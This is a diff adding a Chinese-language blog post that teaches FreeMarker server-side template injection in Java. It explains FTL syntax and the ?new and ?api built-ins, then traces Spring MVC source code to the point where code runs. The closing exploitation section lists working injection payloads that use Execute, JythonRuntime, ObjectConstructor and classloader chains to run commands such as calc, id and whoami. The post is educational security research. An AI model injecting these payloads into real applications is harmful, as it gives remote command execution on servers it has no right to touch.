@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Java安全之FreeMarker 模板注入 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Java安全之FreeMarker 模板注入</h1>
+    <div class="post-meta">
+      <time datetime="2025-07-23">2025-07-23</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/19001763">https://www.cnblogs.com/Zephyr07/articles/19001763</a></p>
+</blockquote>
+<h1 id="1-前情提要："><a href="#1-前情提要：" class="headerlink" title="1.前情提要："></a>1.前情提要：</h1><p>事情的起因在于某次红队中，看到一位大佬利用FreeMarker 模板注入从而达到了一个rce的效果，因为自己对这方面没有了解过，于是乎现在开始恶补一下~</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151518861-900085438.png" alt="image"></p>
+<h1 id="2-基本介绍："><a href="#2-基本介绍：" class="headerlink" title="2.基本介绍："></a>2.基本介绍：</h1><p>FreeMarker 是一款用 Java 编写的模板引擎，主要用于生成文本输出，像 HTML 网页、电子邮件、配置文件等都能生成。它并不依赖于 Servlet 或 Web 应用，既可以在 Web 环境中使用，也能在非 Web 环境下发挥作用。</p>
+<p>FreeMarker Template Language也就是FTL是该模板中使用的模板语言，用于定义输出文本的结构和格式。它通过特定的语法标记将静态文本与动态数据结合，最终生成目标文本。</p>
+<p>广泛应用于Java应用程序的视图层</p>
+<h1 id="3-基础知识："><a href="#3-基础知识：" class="headerlink" title="3.基础知识："></a>3.基础知识：</h1><p>FreeMarker拥有自己的模板编写规则并使用FTL表示，web.html.ftl就是一个FreeMarker模板文件，该文件有四个核心部分：</p>
+<ul>
+<li>文本：固定的内容，会按原样输出</li>
+<li>插值：使用${…} 语法来占位，尖括号中的内容在经过计算和替换后才会输出</li>
+<li>FTL指令：类似于HTML的标签语法，通过&lt;#xxx … &gt;来实现各种特殊功能，比如：&lt;#list elements as element&gt;实现循环输出</li>
+<li>注释：注释中的内容不会输出，和html的注释类似</li>
+</ul>
+<p>demo演示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;FreeMark&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;欢迎来到Zephyr&lt;/h1&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;#-- 循环渲染导航条 --&gt;</span><br><span class="line">      &lt;#list menuItems as item&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;$&#123;item.url&#125;&quot;&gt;$&#123;item.label&#125;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">      &lt;/#list&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;#-- Zephyr（注释部分，不会被输出）--&gt;</span><br><span class="line">      &lt;footer&gt;</span><br><span class="line">        $&#123;currentYear&#125; FreeMark. All rights reserved.</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-语法知识："><a href="#4-语法知识：" class="headerlink" title="4.语法知识："></a>4.语法知识：</h1><h2 id="变量插入"><a href="#变量插入" class="headerlink" title="&lt;1&gt;变量插入"></a>&lt;1&gt;变量插入</h2><p>使用${}来插入变量或者表达式的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Zephyr&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="控制结构"><a href="#控制结构" class="headerlink" title="&lt;2&gt;控制结构"></a>&lt;2&gt;控制结构</h2><p>使用 &lt;#if&gt;&lt;#else&gt;&lt;#list&gt;等来控制逻辑流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;#if condition&gt;</span><br><span class="line">    Do something</span><br><span class="line">&lt;#else&gt;</span><br><span class="line">    Do something else</span><br><span class="line">&lt;/#if&gt;</span><br><span class="line">//此结构的作用是依据条件表达式condition的结果，来决定执行哪一段代码</span><br></pre></td></tr></table></figure>
+
+<h2 id="变量赋值"><a href="#变量赋值" class="headerlink" title="&lt;3&gt;变量赋值"></a>&lt;3&gt;变量赋值</h2><p>&lt;#assign&gt;是用来定义和赋值变量的指令，允许开发人员将一个表达式的结果存储到另一个变量当中去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign greeting = &quot;Hello, world!&quot;&gt;</span><br><span class="line">$&#123;greeting&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="循环遍历"><a href="#循环遍历" class="headerlink" title="&lt;4&gt;循环遍历"></a>&lt;4&gt;循环遍历</h2><p>使用&lt;#list&gt;遍历集合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#list items as item&gt;</span><br><span class="line">$&#123;item&#125;</span><br><span class="line">&lt;/#list&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="宏定义类"><a href="#宏定义类" class="headerlink" title="&lt;5&gt;宏定义类"></a>&lt;5&gt;宏定义类</h2><p>使用&lt;#macro&gt;标签定义一个宏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#macro greet name&gt;</span><br><span class="line">Hello, $&#123;name&#125;!</span><br><span class="line">&lt;/#macro&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过&lt;@macroName&gt;调用它</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;@greet &quot;Zephyr&quot; /&gt; </span><br><span class="line"></span><br><span class="line">&lt;!-- 输出: Hello, Zephyr! --&gt;</span><br><span class="line">//greet不是固定的</span><br></pre></td></tr></table></figure>
+
+<p>同样宏不止可以定义一个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#定义宏</span><br><span class="line">&lt;#macro userInfo name email&gt;</span><br><span class="line">Name: $&#123;name&#125;, Email: $&#123;email&#125;</span><br><span class="line">&lt;/#macro&gt;</span><br><span class="line"></span><br><span class="line">&lt;@userInfo &quot;Zephyr&quot; &quot;Zephyr@example.com&quot; /&gt;</span><br><span class="line">&lt;!-- 输出: Name: Zephyr, Email: Zephyr@example.com --&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="条件判断"><a href="#条件判断" class="headerlink" title="&lt;6&gt;条件判断"></a>&lt;6&gt;条件判断</h2><p>FreeMarker提供了条件判断结构，用于根据特定条件执行不同的操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;#if age &gt;= 18&gt;</span><br><span class="line">    You are an man.</span><br><span class="line">&lt;#elseif age &gt;= 13&gt;</span><br><span class="line">    You are a teenager.</span><br><span class="line">&lt;#else&gt;</span><br><span class="line">    You are a child</span><br><span class="line">&lt;/#if&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="循环遍历-1"><a href="#循环遍历-1" class="headerlink" title="&lt;7&gt;循环遍历"></a>&lt;7&gt;循环遍历</h2><p>借助<code>&lt;#list&gt;</code>指令，能够对集合或数组进行遍历操作。</p>
+<ol>
+<li><strong>遍历列表</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign cities = [&quot;北京&quot;, &quot;上海&quot;, &quot;广州&quot;, &quot;深圳&quot;]&gt;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">&lt;#list cities as city&gt;</span><br><span class="line">    &lt;li&gt;$&#123;city&#125;&lt;/li&gt;</span><br><span class="line">&lt;/#list&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>使用索引</strong><br>利用<code>?index</code>能够获取当前项的索引，索引是从 0 开始计数的。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#list cities as city&gt;</span><br><span class="line">    $&#123;city?index + 1&#125;. $&#123;city&#125;</span><br><span class="line">&lt;/#list&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="包含导入"><a href="#包含导入" class="headerlink" title="&lt;8&gt;包含导入"></a>&lt;8&gt;包含导入</h2><p>FreeMarker 支持从别的文件导入模板或者包含代码片段</p>
+<ol>
+<li><strong>include 指令</strong><br>运用<code>include</code>可以把其他模板包含到当前模板之中</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#include &quot;footer.ftl&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>import 指令</strong><br>通过<code>import</code>能够引入其他模板里的宏</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#import &quot;utils.ftl&quot; as utils&gt;</span><br><span class="line">&lt;@utils.printTime /&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="&lt;9&gt;错误处理"></a>&lt;9&gt;错误处理</h2><p>FreeMarker 提供了一种灵活的方式来处理错误，即通过<code>??</code>操作符检查变量是否存在。</p>
+<ol>
+<li><strong>检查变量是否存在</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#if email??&gt;</span><br><span class="line">    邮箱地址: $&#123;email&#125;</span><br><span class="line">&lt;#else&gt;</span><br><span class="line">    未设置邮箱地址</span><br><span class="line">&lt;/#if&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>默认值</strong><br>使用<code>!</code>符号可以为变量提供默认值。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">欢迎 $&#123;username!&quot;访客&quot;&#125; 登录系统</span><br></pre></td></tr></table></figure>
+
+<h2 id="组合嵌套"><a href="#组合嵌套" class="headerlink" title="&lt;10&gt;组合嵌套"></a>&lt;10&gt;组合嵌套</h2><p>FreeMarker 允许将函数和控制结构嵌套使用，以此来实现更复杂的逻辑和数据展示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign products = [</span><br><span class="line">    &#123;&quot;name&quot;: &quot;手机&quot;, &quot;price&quot;: 3999, &quot;stock&quot;: 10&#125;,</span><br><span class="line">    &#123;&quot;name&quot;: &quot;电脑&quot;, &quot;price&quot;: 8999, &quot;stock&quot;: 5&#125;,</span><br><span class="line">    &#123;&quot;name&quot;: &quot;平板&quot;, &quot;price&quot;: 2999, &quot;stock&quot;: 0&#125;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;商品名称&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;价格&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;库存状态&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;#list products as product&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;$&#123;product.name&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;$&#123;product.price&#125;元&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;</span><br><span class="line">            &lt;#if product.stock &gt; 0&gt;</span><br><span class="line">                &lt;span style=&quot;color: green&quot;&gt;有货 ($&#123;product.stock&#125;)&lt;/span&gt;</span><br><span class="line">            &lt;#else&gt;</span><br><span class="line">                &lt;span style=&quot;color: red&quot;&gt;无货&lt;/span&gt;</span><br><span class="line">            &lt;/#if&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/#list&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="内置函数⭐"><a href="#内置函数⭐" class="headerlink" title="&lt;11&gt;内置函数⭐"></a>&lt;11&gt;内置函数⭐</h2><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>?new内置函数是模板注入中非常重要的一个函数，可以创建任意实现了TemplateModel接口的java对象(并且调用该类的构造方法)</p>
+<p>以及触发没有实现templatemodel接口的类的静态初始化块</p>
+<p>两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承<code>TemplateModel</code>接口的</p>
+<p><code>freemarker.template.utility.JythonRuntime</code>和<code>freemarker.template.utility.Execute</code>（同前情提要）</p>
+<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>value?api 提供对value的api(Java api)的访问，可通过<strong>getclassloader获取类加载器进而加载恶意类，或者也可以通过getResource来实现任意文件读取</strong></p>
+<p>⭐注：该函数只有在<code>api_builtin_enabled</code>为true时才可使用，而该配置在2.3.22版本之后默认为false</p>
+<h1 id="5-漏洞复现："><a href="#5-漏洞复现：" class="headerlink" title="5.漏洞复现："></a>5.漏洞复现：</h1><p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151601898-808210075.png" alt="image"></p>
+<h1 id="6-源码分析："><a href="#6-源码分析：" class="headerlink" title="6.源码分析："></a>6.源码分析：</h1><p>这里分为两部分，一是获取模板，二是解析模板，漏洞成因在解析模板处，所以获取模板的过程我就不详细写了，大家自己跟一下也可以看懂</p>
+<h2 id="6-1获取模板"><a href="#6-1获取模板" class="headerlink" title="6.1获取模板"></a>6.1获取模板</h2><p>因为在 Spring Boot 应用里，所有 HTTP 请求首先会经过DispatcherServlet进行处理。作为 Spring MVC 框架的核心前端控制器，DispatcherServlet 负责接收请求，并依据请求的路径、方法等信息，把请求分发给对应的处理器（Controller）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.web.servlet.DispatcherServlet #doDispatch() –&gt;</span><br><span class="line">org.springframework.web.servlet.DispatcherServlet #processDispatchResult() –&gt;</span><br><span class="line">调用至org.springframework.web.servlet.DispatcherServlet#render()</span><br><span class="line">org.springframework.web.servlet.DispatcherServlet#resolveViewName() –&gt;</span><br><span class="line">org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName() –&gt;</span><br><span class="line">org.springframework.web.servlet.view.ContentNegotiatingViewResolver#getCandidateViews() –&gt;</span><br><span class="line">org.springframework.web.servlet.view.AbstractCachingViewResolver#resolveViewName() –&gt;</span><br><span class="line">org.springframework.web.servlet.view.UrlBasedViewResolver#createView() 创建模板 –&gt; super.createView()–&gt;</span><br><span class="line">org.springframework.web.servlet.view.AbstractCachingViewResolver#createView()–&gt;</span><br><span class="line">org.springframework.web.servlet.view.AbstractCachingViewResolver#loadView()–&gt;</span><br><span class="line">&#123;</span><br><span class="line">org.springframework.web.servlet.view.AbstractTemplateViewResolver#buildView()–&gt;(super.buildView())</span><br><span class="line">org.springframework.web.servlet.view.UrlBasedViewResolver#buildView()</span><br><span class="line">&#125;</span><br><span class="line">view.checkResource()-&gt;</span><br><span class="line">org.springframework.web.servlet.view.freemarker.FreeMarkerView#checkResource()–&gt;</span><br><span class="line">org.springframework.web.servlet.view.freemarker.FreeMarkerView#getTemplate(url, locale)–&gt;</span><br><span class="line">freemarker.template.Configuration#getTemplate() 调用此类同名方法,跟进this.cache.getTemplate()–&gt;</span><br><span class="line">freemarker.cache.TemplateCache#getTemplate() ,跟进this.getTemplateInternal()–&gt;</span><br><span class="line">freemarker.cache.TemplateCache#getTemplateInternal(),此处进行判断 –&gt;</span><br><span class="line">freemarker.cache.TemplateCache#lookupTemplate() –&gt;</span><br><span class="line">freemarker.cache.TemplateLookupStrategy#lookup() –&gt;</span><br><span class="line">freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy()–&gt;</span><br><span class="line">最终调用this.lookupWithLocalizedThenAcquisitionStrategy()–&gt;</span><br><span class="line">调用this.findTemplateSource(path)获取模板实例</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-2解析模板"><a href="#6-2解析模板" class="headerlink" title="6.2解析模板"></a>6.2解析模板</h2><p>咱们回到org.springframework.web.servlet.DispatcherServlet#render()方法中，resolveViewName()加载模板文件后使用view.render()对模板进行解析</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151615229-1245857703.png" alt="image"></p>
+<p>最终会调用到org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender()中来</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151626632-1159895782.png" alt="image"></p>
+<p>我们跟到processTemplate方法中去</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151635018-105724580.png" alt="image"></p>
+<p>在跟到process中去</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151641906-726685472.png" alt="image"></p>
+<p>我们再跟到下一个process方法中去(前面返回了Environment 类，所以后面就调用 Environment#process())</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151649112-1751778600.png" alt="image"></p>
+<p>这段代码我们好好读一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public void process() throws TemplateException, IOException &#123;</span><br><span class="line">    // 从ThreadLocal变量中获取当前线程之前保存的环境对象</span><br><span class="line">    Object savedEnv = threadEnv.get();</span><br><span class="line">    // 将当前实例设置到ThreadLocal中，以便在后续处理中使用</span><br><span class="line">    threadEnv.set(this);</span><br><span class="line">    try &#123;</span><br><span class="line">        // 清除之前执行时可能缓存的值，防止使用过期数据</span><br><span class="line">        clearCachedValues();</span><br><span class="line">        try &#123;</span><br><span class="line">            // 执行模板的自动导入和包含操作，准备模板渲染环境</span><br><span class="line">            doAutoImportsAndIncludes(this);</span><br><span class="line">            // 访问模板的根节点，开始执行模板渲染逻辑</span><br><span class="line">            visit(getTemplate().getRootTreeNode());</span><br><span class="line">            // 如果启用了自动刷新，则刷新输出流</span><br><span class="line">            // 确保所有缓冲数据被写入目标设备</span><br><span class="line">            if (getAutoFlush()) &#123;</span><br><span class="line">                out.flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            // 再次清除缓存值，帮助垃圾回收器释放内存</span><br><span class="line">            clearCachedValues();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        // 恢复之前保存的环境对象，确保线程局部变量状态的正确性</span><br><span class="line">        threadEnv.set(savedEnv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟到visit方法中看一下，发现他对ftl文件进行了一次遍历，若是读取到一条freemaker表达式，就回调visit方法去调用accept方法，跟入</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807151701146-1625087229.png" alt="image"></p>
+<p>freemarker.core.Assignment#accept() 判断 namespaceExp 是否为 null，接着判断 this.operatorType 是否等于 65536，跟进 eval() 方法</p>
+<blockquote>
+<p>(我知道这里大家在跟的时候肯定有问题，别急，下面会有答案)</p>
+</blockquote>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152433502-1818000307.png" alt="image"></p>
+<p>然后判断 constantValue 是否为 null，此处 constantValue 为 null，调用 _eval()</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152448971-1444461131.png" alt="image"></p>
+<p>然后exec也就到了真正能执行代码的时候</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753328086857-fa97fdfb-62f2-4972-af42-9aa7433ad438.png"></p>
+<p>这里因为elemet还是&lt;#assign value&#x3D;”freemarker.template.utility.Execute”?new()&gt;，所以还没弹计算器，只要再次遍历html中的ftl语句到后面的${value(“Calc”)}就成功rce了</p>
+<h3 id="⭐注："><a href="#⭐注：" class="headerlink" title="⭐注："></a>⭐注：</h3><p>这里有人就会说上面我在跟的时候，accept函数并不是你贴的图那样，这里就要提到上面我提到的一句话：</p>
+<p>在这里他会一直去遍历你ftl文件中的内容，所以你最初调试跟进去的accept函数是还没有到ftl语句的普通HTML语言，他就不会去调用我所展示的那一串代码，所以你需要多点几次，直到看到element的内容变成了ftl语言，这时候跟进accept就是想要的结果了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753327834481-1e851221-abea-433a-a50f-36f6bcc75641.png"></p>
+<h1 id="7-漏洞利用："><a href="#7-漏洞利用：" class="headerlink" title="7.漏洞利用："></a>7.漏洞利用：</h1><h2 id="new-函数"><a href="#new-函数" class="headerlink" title="?new()函数"></a>?new()函数</h2><p>freemarker.template.utility.JythonRuntime：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;cmd.exe /c calc&quot;)&lt;/@value&gt;</span><br><span class="line">//原理：通过自定义标签的方式执行Python命令，从而构造远程命令执行</span><br></pre></td></tr></table></figure>
+
+<p>freemarker.template.utility.Execute：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="api-函数"><a href="#api-函数" class="headerlink" title="?api()函数"></a>?api()函数</h2><p><strong>POC1</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(&quot;ClassExposingGSON&quot;)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(&quot;GSON&quot;)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(null)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(&quot;&#123;&#125;&quot;, classLoader.loadClass(&quot;freemarker.template.utility.Execute&quot;))&gt; </span><br><span class="line">$&#123;ex(&quot;open -a Calculator.app&quot;&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC2</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC3</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC4</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;open -a Calculator.app&quot;) &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取文件</strong></p>
